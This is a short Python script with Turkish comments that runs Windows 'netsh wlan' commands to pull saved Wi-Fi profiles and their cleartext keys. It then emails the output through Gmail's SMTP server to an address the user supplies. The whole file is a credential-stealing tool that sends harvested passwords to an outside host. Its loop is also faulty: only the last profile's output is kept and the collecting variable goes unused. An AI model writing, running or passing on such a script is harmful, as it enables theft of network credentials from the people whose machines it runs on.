#!/usr/share/python

import subprocess,re,smtplib

emailim = ""          #Bu kisima kendi email adresinizi yaziniz.
Parolam = ""          #Bu kisima da parolanizi eklemelisiniz.

command1 = "netsh wlan show profile"
networks = subprocess.check_output(command1, shell=True)
network_list = re.findall('(?:Profile\s*:\s)(.*)' , networks)

final_output = ""
for network in network_list:
    command2 = "netsh wlan show profile " + network + " key=clear"
    network_ciktisi = subprocess.check_output(command2, shell=True)
    cikti = network_ciktisi



server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
server.login(emailim, Parolam)
server.sendmail(emailim, emailim, cikti)
server.quit()


